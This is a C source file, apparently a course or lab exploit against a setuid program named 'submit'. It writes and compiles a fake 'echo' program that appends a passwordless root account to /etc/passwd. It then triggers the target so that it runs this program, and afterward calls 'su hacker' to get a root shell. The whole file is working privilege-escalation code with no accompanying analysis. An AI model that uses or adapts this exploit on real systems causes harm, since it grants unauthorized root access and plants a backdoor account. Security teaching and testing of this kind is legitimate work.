#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>

#define TARGET "/usr/local/bin/submit"

int main(void)
{

  char *args[4];
  char *env[1];
	pid_t pid;
	int status;
	
	//C code for echo program, this adds a new root user to /etc/passwd
	char echoProgram[] = "#include <stdio.h>\n int main(void){FILE *file;char exploit[]=\"hacker::0:0:hacker::/bin/bash\";file = fopen(\"/etc/passwd\", \"a+\");fputs(exploit,file);fclose(file);exit(0);}";
	
	//write out the echo program
	FILE *file;
	file = fopen("echo.c", "w");
	fputs(echoProgram,file);
	fclose(file);

	//compile the echo program
	system("gcc echo.c -o echo");

	file = fopen("file.txt", "w");
	fclose(file);

	pid = fork();

	if (pid > 0) {
		//parent
		waitpid(pid, &status, 0);
		//spawn a new root shell when submit finishes
		system("su hacker");
	}

	else {
		//child
		args[0] = TARGET; args[1] = "file.txt"; 
		args[2] = "message"; args[3] = NULL;

		env[0] = NULL;
		//submit calls my echo program
		if (execve(TARGET, args, env) < 0)
		  fprintf(stderr, "execve failed.\n");

	}

 	exit(0);
}

